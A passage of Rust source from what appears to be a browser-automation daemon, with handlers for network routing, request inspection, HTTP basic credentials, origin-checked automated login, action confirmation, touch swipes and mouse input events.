    let params = build_fetch_enable_params(state, patterns).await;
    mgr.client
        .send_command("Fetch.enable", Some(params), Some(&session_id))
        .await?;

    Ok(json!({ "routed": url_pattern }))
}

async fn handle_unroute(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let url = cmd.get("url").and_then(|v| v.as_str());

    {
        let mut routes = state.routes.write().await;
        match url {
            Some(pattern) => {
                routes.retain(|r| r.url_pattern != pattern);
            }
            None => {
                routes.clear();
            }
        }
    }

    let patterns = build_fetch_patterns(state).await;
    if patterns.is_empty() {
        mgr.client
            .send_command("Fetch.disable", None, Some(&session_id))
            .await?;
    } else {
        let params = build_fetch_enable_params(state, patterns).await;
        mgr.client
            .send_command("Fetch.enable", Some(params), Some(&session_id))
            .await?;
    }

    let label = url.unwrap_or("all");
    Ok(json!({ "unrouted": label }))
}

pub fn matches_status_filter(status: Option<i64>, filter: &str) -> bool {
    let Some(code) = status else { return false };
    let f = filter.to_lowercase();
    if let Ok(exact) = f.parse::<i64>() {
        return code == exact;
    }
    if f.len() == 3 && f.ends_with("xx") {
        if let Ok(prefix) = f[..1].parse::<i64>() {
            return code / 100 == prefix;
        }
    }
    if let Some((lo, hi)) = f.split_once('-') {
        if let (Ok(lo), Ok(hi)) = (lo.parse::<i64>(), hi.parse::<i64>()) {
            return code >= lo && code <= hi;
        }
    }
    false
}

async fn handle_requests(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    if cmd.get("clear").and_then(|v| v.as_bool()).unwrap_or(false) {
        state.tracked_requests.clear();
        return Ok(json!({ "cleared": true }));
    }

    if !state.request_tracking {
        state.request_tracking = true;
        state.refresh_active_iframe_sessions().await;
        if let Some(ref mgr) = state.browser {
            if let Ok(session_id) = mgr.active_session_id() {
                let _ = mgr
                    .client
                    .send_command_no_params("Network.enable", Some(session_id))
                    .await;
            }
        }
    }

    let filter = cmd.get("filter").and_then(|v| v.as_str());
    let type_filter = cmd.get("type").and_then(|v| v.as_str());
    let method_filter = cmd.get("method").and_then(|v| v.as_str());
    let status_filter = cmd.get("status").and_then(|v| v.as_str());

    let type_list: Vec<String> = type_filter
        .map(|t| t.split(',').map(|s| s.trim().to_lowercase()).collect())
        .unwrap_or_default();

    let requests: Vec<&TrackedRequest> = state
        .tracked_requests
        .iter()
        .filter(|r| {
            if let Some(f) = filter {
                if !r.url.contains(f) {
                    return false;
                }
            }
            if !type_list.is_empty() && !type_list.contains(&r.resource_type.to_lowercase()) {
                return false;
            }
            if let Some(m) = method_filter {
                if !r.method.eq_ignore_ascii_case(m) {
                    return false;
                }
            }
            if let Some(s) = status_filter {
                if !matches_status_filter(r.status, s) {
                    return false;
                }
            }
            true
        })
        .collect();

    Ok(json!({ "requests": requests }))
}

async fn handle_request_detail(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let request_id = cmd
        .get("requestId")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'requestId' parameter")?;

    // Redirect hops share a request id; the last one is the response a body
    // belongs to.
    let entry = state
        .tracked_requests
        .iter()
        .rev()
        .find(|r| r.request_id == request_id)
        .ok_or("Request not found")?;

    let mut result = serde_json::to_value(entry).unwrap_or(json!({}));

    if let Some(ref mgr) = state.browser {
        if let Ok(session_id) = mgr.active_session_id() {
            if let Ok(body_result) = mgr
                .client
                .send_command(
                    "Network.getResponseBody",
                    Some(json!({ "requestId": request_id })),
                    Some(session_id),
                )
                .await
            {
                let base64_encoded = body_result
                    .get("base64Encoded")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let body = body_result
                    .get("body")
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                if base64_encoded {
                    result["responseBody"] = json!(format!("[base64, {} chars]", body.len()));
                } else {
                    result["responseBody"] = json!(body);
                }
            }
        }
    }

    Ok(result)
}

async fn handle_http_credentials(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let username = cmd
        .get("username")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'username' parameter")?;
    let password = cmd
        .get("password")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'password' parameter")?;

    let encoded = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        format!("{}:{}", username, password),
    );

    let mut headers = HashMap::new();
    headers.insert("Authorization".to_string(), format!("Basic {}", encoded));
    network::set_extra_headers(&mgr.client, &session_id, &headers).await?;
    // Network.setExtraHTTPHeaders replaces the target's complete global
    // header set, so keep the same replacement ready for tabs opened later.
    state.session_setup.extra_headers = Some(headers);

    Ok(json!({ "set": true }))
}

// ---------------------------------------------------------------------------
// Auth handlers
// ---------------------------------------------------------------------------

struct AuthLoginElement {
    ref_map: RefMap,
}

impl AuthLoginElement {
    async fn fill(
        &self,
        client: &super::cdp::client::CdpClient,
        session_id: &str,
        value: &str,
    ) -> Result<(), String> {
        let (object_id, effective_session_id) = super::element::resolve_element_object_id(
            client,
            session_id,
            &self.ref_map,
            AUTH_LOGIN_ELEMENT_REF,
            &HashMap::new(),
        )
        .await?;
        let result = client
            .send_command_typed::<_, super::cdp::types::EvaluateResult>(
                "Runtime.callFunctionOn",
                &super::cdp::types::CallFunctionOnParams {
                    function_declaration: r#"function(value) {
                        const editable = () => this.isConnected &&
                            !this.matches(':disabled') && !this.readOnly;
                        const focused = () => editable() &&
                            this.ownerDocument.activeElement === this;
                        if (!editable()) return false;
                        this.focus();
                        if (!focused()) return false;
                        if (typeof this.select === 'function') {
                            this.select();
                        } else if (this.isContentEditable ||
                            this.contentEditable === 'true' ||
                            this.contentEditable === 'plaintext-only') {
                            const range = this.ownerDocument.createRange();
                            range.selectNodeContents(this);
                            const selection = this.ownerDocument.getSelection();
                            selection.removeAllRanges();
                            selection.addRange(range);
                        } else {
                            return false;
                        }
                        if (!focused()) return false;
                        if (typeof this.ownerDocument.execCommand === 'function') {
                            const inserted = this.ownerDocument.execCommand(
                                value === '' ? 'delete' : 'insertText', false, value
                            );
                            return inserted && this.isConnected;
                        }
                        if (this instanceof HTMLInputElement || this instanceof HTMLTextAreaElement) {
                            const prototype = this instanceof HTMLInputElement
                                ? HTMLInputElement.prototype : HTMLTextAreaElement.prototype;
                            Object.getOwnPropertyDescriptor(prototype, 'value').set.call(this, value);
                        } else {
                            this.textContent = value;
                        }
                        this.dispatchEvent(new Event('input', { bubbles: true }));
                        return this.isConnected;
                    }"#
                    .to_string(),
                    object_id: Some(object_id.clone()),
                    arguments: Some(vec![super::cdp::types::CallArgument {
                        value: Some(json!(value)),
                        object_id: None,
                    }]),
                    return_by_value: Some(true),
                    await_promise: Some(false),
                },
                Some(&effective_session_id),
            )
            .await;
        let mut object_ids = std::collections::HashSet::from([object_id]);
        if let Ok(result) = &result {
            object_ids.extend(result.result.object_id.clone());
            object_ids.extend(
                result
                    .exception_details
                    .as_ref()
                    .and_then(|details| details.exception.as_ref())
                    .and_then(|exception| exception.object_id.clone()),
            );
        }
        for object_id in object_ids {
            let _ = client
                .send_command(
                    "Runtime.releaseObject",
                    Some(json!({ "objectId": object_id })),
                    Some(&effective_session_id),
                )
                .await;
        }
        let result = result?;
        if result.exception_details.is_some() || result.result.value != Some(json!(true)) {
            return Err(
                "Could not fill the selected login field; it may have changed or lost focus"
                    .to_string(),
            );
        }
        Ok(())
    }
}

/// Wait for any selector in `selectors` to match a usable element and retain
/// that element's stable backend node identity for the subsequent interaction.
///
/// This is used by `auth_login` auto-detection so SPA login forms can render
/// after initial navigation without requiring global network-idle.
async fn wait_for_any_selector(
    client: &super::cdp::client::CdpClient,
    session_id: &str,
    selectors: &[&str],
    timeout_ms: u64,
) -> Result<AuthLoginElement, String> {
    let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_millis(timeout_ms);

    loop {
        for selector in selectors {
            let expression = format!(
                r#"(() => {{
                    return Array.from(document.querySelectorAll({sel})).find((el) => {{
                        const r = el.getBoundingClientRect();
                        const s = window.getComputedStyle(el);
                        const opacity = parseFloat(s.opacity || '1');
                        const isVisible =
                            r.width > 0 &&
                            r.height > 0 &&
                            s.visibility !== 'hidden' &&
                            s.display !== 'none' &&
                            (!Number.isFinite(opacity) || opacity > 0);

                        if (!isVisible || el.matches(':disabled')) return false;
                        if (el instanceof HTMLInputElement && el.type === 'hidden') return false;
                        if ((el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement) && el.readOnly) return false;
                        return true;
                    }}) || null;
                }})()"#,
                sel = serde_json::to_string(selector).unwrap_or_default()
            );

            let result: super::cdp::types::EvaluateResult = client
                .send_command_typed(
                    "Runtime.evaluate",
                    &super::cdp::types::EvaluateParams {
                        expression,
                        return_by_value: Some(false),
                        await_promise: Some(true),
                    },
                    Some(session_id),
                )
                .await?;

            if result.exception_details.is_some()
                || result.result.subtype.as_deref() != Some("node")
            {
                let mut object_ids = std::collections::HashSet::new();
                object_ids.extend(result.result.object_id);
                object_ids.extend(
                    result
                        .exception_details
                        .and_then(|details| details.exception)
                        .and_then(|exception| exception.object_id),
                );
                for object_id in object_ids {
                    let _ = client
                        .send_command(
                            "Runtime.releaseObject",
                            Some(json!({ "objectId": object_id })),
                            Some(session_id),
                        )
                        .await;
                }
                continue;
            }

            let Some(object_id) = result.result.object_id else {
                continue;
            };
            let describe = client
                .send_command(
                    "DOM.describeNode",
                    Some(json!({ "objectId": object_id })),
                    Some(session_id),
                )
                .await;
            let _ = client
                .send_command(
                    "Runtime.releaseObject",
                    Some(json!({ "objectId": object_id })),
                    Some(session_id),
                )
                .await;
            let Ok(describe) = describe else {
                continue;
            };
            let Some(backend_node_id) = describe
                .pointer("/node/backendNodeId")
                .and_then(Value::as_i64)
            else {
                continue;
            };
            let mut ref_map = RefMap::new();
            ref_map.add_exact_backend_node(AUTH_LOGIN_ELEMENT_REF.to_string(), backend_node_id);
            return Ok(AuthLoginElement { ref_map });
        }

        if tokio::time::Instant::now() >= deadline {
            return Err(format!("Wait timed out after {}ms", timeout_ms));
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(
            AUTH_LOGIN_SELECTOR_POLL_INTERVAL_MS,
        ))
        .await;
    }
}

async fn handle_auth_save(cmd: &Value) -> Result<Value, String> {
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name'")?;
    let url = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url'")?;
    let username = cmd
        .get("username")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'username'")?;
    let password = cmd
        .get("password")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'password'")?;
    let username_selector = cmd.get("usernameSelector").and_then(|v| v.as_str());
    let password_selector = cmd.get("passwordSelector").and_then(|v| v.as_str());
    let submit_selector = cmd.get("submitSelector").and_then(|v| v.as_str());
    auth::auth_save(
        name,
        url,
        username,
        password,
        username_selector,
        password_selector,
        submit_selector,
    )
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct AuthLoginOrigin(String);

#[derive(Debug, Clone)]
struct AuthLoginBoundPage {
    target_id: String,
    session_id: String,
}

/// Parse a URL into the normalized HTTP(S) origin used to constrain
/// `auth login --no-navigate`. Paths, queries, and fragments are intentionally
/// excluded, and URL serialization normalizes explicit default ports.
fn auth_login_origin(raw_url: &str, label: &str) -> Result<AuthLoginOrigin, String> {
    let has_unambiguous_authority = raw_url
        .split_once(':')
        .map(|(_, rest)| rest)
        .is_some_and(|rest| rest.starts_with("//") && !rest.starts_with("///"));
    let parsed = url::Url::parse(raw_url).map_err(|_| {
        format!(
            "Invalid {} URL: expected an absolute HTTP(S) URL with a host",
            label
        )
    })?;
    if !has_unambiguous_authority
        || !matches!(parsed.scheme(), "http" | "https")
        || parsed.host_str().is_none()
    {
        return Err(format!(
            "Invalid {} URL: expected an absolute HTTP(S) URL with a host",
            label
        ));
    }

    Ok(AuthLoginOrigin(parsed.origin().ascii_serialization()))
}

/// Bind no-navigation login to the current top-level page before any external
/// credential provider is invoked. This rejects missing, blank, opaque, and
/// otherwise unusable pages without reading a secret unnecessarily.
async fn bind_auth_login_active_page(state: &DaemonState) -> Result<AuthLoginBoundPage, String> {
    let mgr = state
        .browser
        .as_ref()
        .ok_or(AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR)?;
    if mgr.page_count() == 0 {
        return Err(AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR.to_string());
    }
    let target_id = mgr
        .active_target_id()
        .map_err(|_| AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR.to_string())?
        .to_string();
    let session_id = mgr
        .active_session_id()
        .map_err(|_| AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR.to_string())?
        .to_string();
    let current_url = mgr
        .get_url()
        .await
        .map_err(|_| AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR.to_string())?;
    auth_login_origin(&current_url, "current page")
        .map_err(|_| AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR.to_string())?;

    Ok(AuthLoginBoundPage {
        target_id,
        session_id,
    })
}

/// Ensure credential-bearing work still targets the page that was active
/// when no-navigation login began, and that its live document remains on the
/// expected origin. Diagnostics contain origins only, never URL paths or
/// credential values.
async fn validate_auth_login_active_page(
    mgr: &BrowserManager,
    bound_page: &AuthLoginBoundPage,
    expected_origin: &AuthLoginOrigin,
) -> Result<(), String> {
    let active_target_id = mgr.active_target_id().map_err(|_| {
        "Active browser page changed during auth login --no-navigate; retry on the intended login page"
            .to_string()
    })?;
    let active_session_id = mgr.active_session_id().map_err(|_| {
        "Active browser page changed during auth login --no-navigate; retry on the intended login page"
            .to_string()
    })?;
    if active_target_id != bound_page.target_id || active_session_id != bound_page.session_id {
        return Err(
            "Active browser page changed during auth login --no-navigate; retry on the intended login page"
                .to_string(),
        );
    }

    let current_url = mgr.get_url().await.map_err(|_| {
        "Active browser page changed during auth login --no-navigate; retry on the intended login page"
            .to_string()
    })?;
    let current_origin = auth_login_origin(&current_url, "current page")?;
    ensure_auth_login_origin_matches(&current_origin, expected_origin)
}

fn ensure_auth_login_origin_matches(
    current_origin: &AuthLoginOrigin,
    expected_origin: &AuthLoginOrigin,
) -> Result<(), String> {
    if current_origin == expected_origin {
        return Ok(());
    }
    Err(format!(
        "Current page origin {} does not match credential origin {}",
        current_origin.0, expected_origin.0
    ))
}

async fn handle_auth_login(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name'")?;
    let no_navigate = cmd
        .get("noNavigate")
        .and_then(|value| value.as_bool())
        .unwrap_or(false);
    let bound_page = if no_navigate {
        Some(bind_auth_login_active_page(state).await?)
    } else {
        None
    };
    if !no_navigate && state.browser.is_none() {
        return Err("Browser not launched".to_string());
    }
    let url_override = cmd.get("url").and_then(|v| v.as_str());
    let override_origin = if no_navigate {
        url_override
            .map(|url| auth_login_origin(url, "credential"))
            .transpose()?
    } else {
        None
    };
    if let (Some(bound_page), Some(override_origin)) = (&bound_page, &override_origin) {
        let mgr = state
            .browser
            .as_ref()
            .ok_or(AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR)?;
        validate_auth_login_active_page(mgr, bound_page, override_origin).await?;
    }
    let cred = if let Some(provider) = cmd.get("credentialProvider").and_then(|v| v.as_str()) {
        let command_plugins = cmd
            .get("plugins")
            .and_then(|v| {
                serde_json::from_value::<Vec<crate::plugins::PluginConfig>>(v.clone()).ok()
            })
            .unwrap_or_else(crate::plugins::plugins_from_env);
        let resolved = crate::plugins::resolve_credential_with_plugins(
            provider,
            &command_plugins,
            crate::plugins::CredentialResolveRequest {
                profile_name: name,
                item_ref: cmd.get("credentialItem").and_then(|v| v.as_str()),
                url: url_override,
            },
        )
        .await?;
        auth::AuthProfile {
            name: name.to_string(),
            url: url_override
                .map(String::from)
                .or(resolved.url)
                .unwrap_or_default(),
            username: resolved.username,
            password: resolved.password,
            username_selector: resolved.username_selector,
            password_selector: resolved.password_selector,
            submit_selector: resolved.submit_selector,
            created_at: None,
            last_login_at: None,
        }
    } else {
        let mut profile = auth::credentials_get_full(name)?;
        if let Some(url) = url_override {
            profile.url = url.to_string();
        }
        profile
    };
    if cred.url.is_empty() {
        return Err("Credential has no URL".to_string());
    }
    let auth::AuthProfile {
        url,
        username,
        password,
        username_selector: stored_username_selector,
        password_selector: stored_password_selector,
        submit_selector: stored_submit_selector,
        ..
    } = cred;

    // The login fills this password itself; a capture must not keep it.
    state.flow.add_secret(&password);
    let auth_timeout_ms = state.timeout_ms(cmd);
    let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
    let expected_origin = if no_navigate {
        let origin = auth_login_origin(&url, "credential")?;
        validate_auth_login_active_page(
            mgr,
            bound_page
                .as_ref()
                .expect("no-navigation login must bind an active page"),
            &origin,
        )
        .await?;
        // Auth login always locates its form in the top-level document. Ignore
        // a prior `frame` selection for this command without mutating the
        // caller's persistent frame selection.
        super::element::set_active_frame(None);
        Some(origin)
    } else {
        mgr.navigate(&url, AUTH_LOGIN_WAIT_UNTIL).await?;
        None
    };

    let session_id = mgr.active_session_id()?.to_string();

    let preferred_user_selectors = [
        "input[type=email]",
        "input[name=email]",
        "input[id=email]",
        "input[autocomplete=email]",
        "input[autocomplete=username]",
        "input[name=username]",
        "input[name*=email i]",
        "input[name*=user i]",
        "input[id*=email i]",
        "input[id*=user i]",
        "input[type=text][name*=email i]",
        "input[type=text][name*=user i]",
        "input[type=text][id*=email i]",
        "input[type=text][id*=user i]",
        "input[type=text][autocomplete=email]",
        "input[type=text][autocomplete=username]",
    ];
    let fallback_user_selectors = ["input[type=text]", "input:not([type])"];
    let auto_submit_selectors = [
        "button[type=submit]",
        "input[type=submit]",
        "button:not([type])",
    ];

    let username_sel = cmd
        .get("usernameSelector")
        .and_then(|v| v.as_str())
        .map(String::from)
        .or(stored_username_selector);
    let password_sel = cmd
        .get("passwordSelector")
        .and_then(|v| v.as_str())
        .map(String::from)
        .or(stored_password_selector);
    let submit_sel = cmd
        .get("submitSelector")
        .and_then(|v| v.as_str())
        .map(String::from)
        .or(stored_submit_selector);

    // Find and fill username
    let user_element = if let Some(s) = username_sel {
        wait_for_any_selector(&mgr.client, &session_id, &[s.as_str()], auth_timeout_ms)
            .await
            .map_err(|_| format!("Timed out waiting for username selector '{}'", s))?
    } else {
        let preferred_window_ms = auth_timeout_ms.min(AUTH_LOGIN_PREFERRED_SELECTOR_WINDOW_MS);
        let fallback_window_ms = auth_timeout_ms.saturating_sub(preferred_window_ms);

        match wait_for_any_selector(
            &mgr.client,
            &session_id,
            &preferred_user_selectors,
            preferred_window_ms,
        )
        .await
        {
            Ok(selector) => selector,
            Err(_) => {
                if fallback_window_ms == 0 {
                    return Err(format!(
                        "Timed out waiting for username field (preferred selectors for {}ms: {})",
                        preferred_window_ms,
                        preferred_user_selectors.join(", ")
                    ));
                }

                wait_for_any_selector(
                    &mgr.client,
                    &session_id,
                    &fallback_user_selectors,
                    fallback_window_ms,
                )
                .await
                .map_err(|_| {
                    format!(
                        "Timed out waiting for username field (preferred selectors for {}ms: {}; fallback selectors for {}ms: {})",
                        preferred_window_ms,
                        preferred_user_selectors.join(", "),
                        fallback_window_ms,
                        fallback_user_selectors.join(", ")
                    )
                })?
            }
        }
    };
    if let (Some(bound_page), Some(expected_origin)) = (&bound_page, &expected_origin) {
        validate_auth_login_active_page(mgr, bound_page, expected_origin).await?;
    }
    user_element
        .fill(&mgr.client, &session_id, &username)
        .await?;

    // Find and fill password
    let pass_sel = password_sel.unwrap_or_else(|| "input[type=password]".to_string());
    let pass_element = wait_for_any_selector(
        &mgr.client,
        &session_id,
        &[pass_sel.as_str()],
        auth_timeout_ms,
    )
    .await
    .map_err(|_| format!("Timed out waiting for password selector '{}'", pass_sel))?;
    if let (Some(bound_page), Some(expected_origin)) = (&bound_page, &expected_origin) {
        validate_auth_login_active_page(mgr, bound_page, expected_origin).await?;
    }
    pass_element
        .fill(&mgr.client, &session_id, &password)
        .await?;

    // Find and click submit
    let submit_element = if let Some(s) = submit_sel {
        wait_for_any_selector(&mgr.client, &session_id, &[s.as_str()], auth_timeout_ms)
            .await
            .map_err(|_| format!("Timed out waiting for submit selector '{}'", s))?
    } else {
        wait_for_any_selector(
            &mgr.client,
            &session_id,
            &auto_submit_selectors,
            auth_timeout_ms,
        )
        .await
        .map_err(|_| {
            format!(
                "Timed out waiting for submit button (tried selectors: {})",
                auto_submit_selectors.join(", ")
            )
        })?
    };
    if let (Some(bound_page), Some(expected_origin)) = (&bound_page, &expected_origin) {
        validate_auth_login_active_page(mgr, bound_page, expected_origin).await?;
    }
    let result = interaction::click(
        &mgr.client,
        &session_id,
        &submit_element.ref_map,
        AUTH_LOGIN_ELEMENT_REF,
        "left",
        1,
        &state.iframe_sessions,
    )
    .await?;
    record_click_animation(
        &result,
        &mut state.mouse_state,
        &state.recording_state.shared_cursor,
    );

    // Wait for navigation after submit (with fallback timeout)
    let mut rx = mgr.client.subscribe();
    let post_submit_timeout_ms = auth_timeout_ms.min(10_000);
    let deadline =
        tokio::time::Instant::now() + tokio::time::Duration::from_millis(post_submit_timeout_ms);
    let mut navigated = false;

    loop {
        let result = tokio::time::timeout_at(deadline, rx.recv()).await;
        match result {
            Ok(Ok(event)) => {
                if event.session_id.as_deref() == Some(&session_id) {
                    match event.method.as_str() {
                        "Page.frameNavigated" | "Page.loadEventFired" => {
                            navigated = true;
                            break;
                        }
                        _ => {}
                    }
                }
            }
            Ok(Err(_)) => break,
            Err(_) => break,
        }
    }

    if !navigated {
        let fallback_sleep_ms = auth_timeout_ms.min(2_000);
        if fallback_sleep_ms > 0 {
            tokio::time::sleep(tokio::time::Duration::from_millis(fallback_sleep_ms)).await;
        }
    }

    Ok(json!({ "loggedIn": true, "name": name }))
}

// ---------------------------------------------------------------------------
// Confirmation handlers (stub)
// ---------------------------------------------------------------------------

async fn handle_confirm(_cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let pending = state
        .pending_confirmation
        .take()
        .ok_or("No pending confirmation")?;

    let mut approved_actions = pending.approved_actions.clone();
    if !approved_actions.iter().any(|a| a == &pending.action) {
        approved_actions.push(pending.action.clone());
    }
    let previous_confirmed = std::mem::replace(
        &mut state.confirmed_policy_actions,
        approved_actions.into_iter().collect(),
    );
    state.preloaded_flow = pending.flow.clone();
    let replay = confirmation_replay_command(&pending.cmd);
    let result = Box::pin(execute_command(&replay, state)).await;
    state.preloaded_flow = None;
    state.confirmed_policy_actions = previous_confirmed;

    Ok(json!({ "confirmed": true, "action": pending.action, "result": result }))
}

/// The parked command as `confirm` replays it: without its action policy and
/// confirm actions, which already applied when it was parked, so the replay
/// runs under the session's current policy. Its allowed domains stay, since
/// they apply only at the launch the replay runs; a change to the session's
/// allowed domains drops the pending confirmation instead.
fn confirmation_replay_command(cmd: &Value) -> Value {
    let mut replay = cmd.clone();
    if let Some(object) = replay.as_object_mut() {
        if let Ok(patch) = Patch::from_wire(object.get("settings")) {
            match patch.without_live_security_settings().to_wire() {
                Some(wire) => {
                    object.insert("settings".to_string(), wire);
                }
                None => {
                    object.remove("settings");
                }
            }
        }
    }
    replay
}

async fn handle_deny(_cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let pending = state
        .pending_confirmation
        .take()
        .ok_or("No pending confirmation")?;

    Ok(json!({ "denied": true, "action": pending.action }))
}

// ---------------------------------------------------------------------------
// iOS handlers (stub)
// ---------------------------------------------------------------------------

async fn handle_swipe(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    // Route through Appium for iOS/WebDriver
    if let Some(ref appium) = state.appium {
        if state.browser.is_none() {
            let start_x = cmd.get("startX").and_then(|v| v.as_f64()).unwrap_or(200.0);
            let start_y = cmd.get("startY").and_then(|v| v.as_f64()).unwrap_or(400.0);
            let end_x = cmd.get("endX").and_then(|v| v.as_f64()).unwrap_or(200.0);
            let end_y = cmd.get("endY").and_then(|v| v.as_f64()).unwrap_or(100.0);

            if let Some(direction) = cmd.get("direction").and_then(|v| v.as_str()) {
                let distance = cmd
                    .get("distance")
                    .and_then(|v| v.as_f64())
                    .unwrap_or(300.0);
                let (dx, dy) = match direction {
                    "up" => (0.0, -distance),
                    "down" => (0.0, distance),
                    "left" => (-distance, 0.0),
                    "right" => (distance, 0.0),
                    _ => (0.0, -distance),
                };
                let actual_end_x = start_x + dx;
                let actual_end_y = start_y + dy;
                let duration = cmd.get("duration").and_then(|v| v.as_u64()).unwrap_or(800);
                appium
                    .swipe(start_x, start_y, actual_end_x, actual_end_y, duration)
                    .await?;
                return Ok(json!({ "swiped": direction }));
            }

            let duration = cmd.get("duration").and_then(|v| v.as_u64()).unwrap_or(800);
            appium
                .swipe(start_x, start_y, end_x, end_y, duration)
                .await?;
            return Ok(json!({ "swiped": true, "from": [start_x, start_y], "to": [end_x, end_y] }));
        }
    }

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let start_x = cmd.get("startX").and_then(|v| v.as_f64()).unwrap_or(200.0);
    let start_y = cmd.get("startY").and_then(|v| v.as_f64()).unwrap_or(400.0);
    let end_x = cmd.get("endX").and_then(|v| v.as_f64()).unwrap_or(200.0);
    let end_y = cmd.get("endY").and_then(|v| v.as_f64()).unwrap_or(100.0);

    if let Some(direction) = cmd.get("direction").and_then(|v| v.as_str()) {
        let distance = cmd
            .get("distance")
            .and_then(|v| v.as_f64())
            .unwrap_or(300.0);
        let (dx, dy) = match direction {
            "up" => (0.0, -distance),
            "down" => (0.0, distance),
            "left" => (-distance, 0.0),
            "right" => (distance, 0.0),
            _ => (0.0, -distance),
        };
        let cx = start_x;
        let cy = start_y;

        mgr.client
            .send_command(
                "Input.dispatchTouchEvent",
                Some(json!({ "type": "touchStart", "touchPoints": [{ "x": cx, "y": cy }] })),
                Some(&session_id),
            )
            .await?;

        let steps = 10;
        for i in 1..=steps {
            let x = cx + dx * (i as f64) / (steps as f64);
            let y = cy + dy * (i as f64) / (steps as f64);
            mgr.client
                .send_command(
                    "Input.dispatchTouchEvent",
                    Some(json!({ "type": "touchMove", "touchPoints": [{ "x": x, "y": y }] })),
                    Some(&session_id),
                )
                .await?;
            tokio::time::sleep(tokio::time::Duration::from_millis(16)).await;
        }

        mgr.client
            .send_command(
                "Input.dispatchTouchEvent",
                Some(json!({ "type": "touchEnd", "touchPoints": [] })),
                Some(&session_id),
            )
            .await?;

        return Ok(json!({ "swiped": direction }));
    }

    // Manual coordinates
    mgr.client
        .send_command(
            "Input.dispatchTouchEvent",
            Some(json!({ "type": "touchStart", "touchPoints": [{ "x": start_x, "y": start_y }] })),
            Some(&session_id),
        )
        .await?;

    let steps = 10;
    for i in 1..=steps {
        let x = start_x + (end_x - start_x) * (i as f64) / (steps as f64);
        let y = start_y + (end_y - start_y) * (i as f64) / (steps as f64);
        mgr.client
            .send_command(
                "Input.dispatchTouchEvent",
                Some(json!({ "type": "touchMove", "touchPoints": [{ "x": x, "y": y }] })),
                Some(&session_id),
            )
            .await?;
        tokio::time::sleep(tokio::time::Duration::from_millis(16)).await;
    }

    mgr.client
        .send_command(
            "Input.dispatchTouchEvent",
            Some(json!({ "type": "touchEnd", "touchPoints": [] })),
            Some(&session_id),
        )
        .await?;

    Ok(json!({ "swiped": true, "from": [start_x, start_y], "to": [end_x, end_y] }))
}

async fn handle_device_list() -> Result<Value, String> {
    #[cfg(target_os = "macos")]
    {
        use super::webdriver::ios;
        let devices = ios::list_all_devices()?;
        Ok(ios::to_device_json(&devices))
    }

    #[cfg(not(target_os = "macos"))]
    {
        Err("device_list is only available on macOS with Xcode".to_string())
    }
}

// ---------------------------------------------------------------------------
// Input event handlers
// ---------------------------------------------------------------------------

fn mouse_button_mask(button: &str) -> i32 {
    match button {
        "left" => 1,
        "right" => 2,
        "middle" => 4,
        "back" => 8,
        "forward" => 16,
        _ => 0,
    }
}

fn primary_button_from_mask(buttons: i32) -> &'static str {
    if buttons & 1 != 0 {
        "left"
    } else if buttons & 2 != 0 {
        "right"
    } else if buttons & 4 != 0 {
        "middle"
    } else if buttons & 8 != 0 {
        "back"
    } else if buttons & 16 != 0 {
        "forward"
    } else {
        "none"
    }
}

#[allow(clippy::too_many_arguments)]
fn build_mouse_event_params(
    mouse_state: &mut MouseState,
    event_type: &str,
    x: Option<f64>,
    y: Option<f64>,
    button: Option<&str>,
    buttons: Option<i32>,
    click_count: Option<i32>,
    delta_x: Option<f64>,
    delta_y: Option<f64>,
    modifiers: Option<i32>,
) -> DispatchMouseEventParams {
    let x = x.unwrap_or(mouse_state.x);
    let y = y.unwrap_or(mouse_state.y);
    mouse_state.x = x;
    mouse_state.y = y;

    let mut next_buttons = buttons.unwrap_or(mouse_state.buttons);
    if buttons.is_none() {
        match event_type {
            "mousePressed" => {
                next_buttons |= mouse_button_mask(button.unwrap_or("left"));
            }
            "mouseReleased" => {
                next_buttons &= !mouse_button_mask(button.unwrap_or("left"));
            }
            _ => {}
        }
    }
    mouse_state.buttons = next_buttons;

    DispatchMouseEventParams {
        event_type: event_type.to_string(),
        x,
        y,
        button: Some(
            button
                .unwrap_or(primary_button_from_mask(next_buttons))
                .to_string(),
        ),
        buttons: Some(next_buttons),
        click_count,
        delta_x,
        delta_y,
        modifiers,
    }
}

async fn handle_input_mouse(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let event_type = cmd
        .get("type")
        .and_then(|v| v.as_str())
        .unwrap_or("mouseMoved");
    let mut mouse_state = state.mouse_state;
